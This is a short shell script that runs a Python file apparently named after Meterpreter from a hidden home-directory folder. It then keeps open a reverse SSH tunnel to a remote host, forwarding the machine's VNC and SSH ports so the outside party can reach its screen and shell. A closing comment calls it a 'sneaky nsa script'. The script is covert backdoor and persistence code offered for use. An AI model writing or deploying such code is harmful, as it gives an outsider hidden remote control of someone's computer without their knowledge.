#!/bin/sh
python /Users/<inser username>/.dtc2/meterp.py
isitup=`ps auxwww | grep 2222 | grep ssh | grep -v grep| wc -l`
createTunnel() {
    /usr/bin/ssh -f -N -R5900:localhost:5900 -R2222:localhost:22 tunnel@somehost 2>&1 > /dev/null
}

if [ "$isitup" -lt 2 ]; then
    createTunnel
fi
# fire sneaky nsa script
